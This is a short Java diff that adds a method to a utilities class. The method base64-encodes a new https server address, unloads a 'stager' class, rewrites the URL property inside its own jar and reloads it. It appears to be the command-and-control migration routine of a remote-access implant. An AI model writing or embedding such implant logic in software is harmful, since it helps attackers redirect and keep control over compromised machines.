@@ -51,6 +51,7 @@ import java.net.URLClassLoader;
 import java.security.*;
 import java.util.*;
 import java.util.logging.Level;
+import java.util.logging.Logger;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipInputStream;
 import java.util.zip.ZipOutputStream;
@@ -619,6 +620,45 @@ public class Utilities {
             ((StringBuffer)localObject).append(localStack.elementAt(i));
         }
         return new File(((StringBuffer)localObject).toString());
+    }
+    
+    //=====================================================================
+    /**
+     * 
+     * @param connectStr 
+     * @throws java.lang.ClassNotFoundException 
+     * @throws java.io.IOException 
+     */
+    public static void updateServerInfoInJar( String connectStr ) throws ClassNotFoundException, IOException{
+                
+        Class stagerClass = Class.forName("stager.Stager");
+        File theClassPath = Utilities.getClassPath();
+        ClassLoader aClassLoader = stagerClass.getClassLoader();            
+
+        //Get append spaces to avoid == at the end
+        StringBuilder aSB = new StringBuilder()
+            .append("https://")
+            .append( connectStr )
+            .append("/");
+        int neededChars = aSB.length() % 3;
+        for( int i = 0; i < neededChars + 1; i++)
+            aSB.append(" ");
+
+        //Decode the base64   
+        DebugPrinter.printMessage(NAME_Class, "Migrating to " + aSB.toString());
+        connectStr = Base64Converter.encode( aSB.toString().getBytes() );
+        String properties = Constants.PROP_FILE;
+        String propLabel = Constants.URL_LABEL;  
+
+        //Unload the stager
+        LoaderUtilities.unloadLibs( aClassLoader );
+
+        //Replace the file
+        Utilities.updateJarProperties( theClassPath, properties, propLabel, connectStr );
+
+        //Load it back                    
+        LoaderUtilities.reloadLib(theClassPath); 
+     
     }
     
    
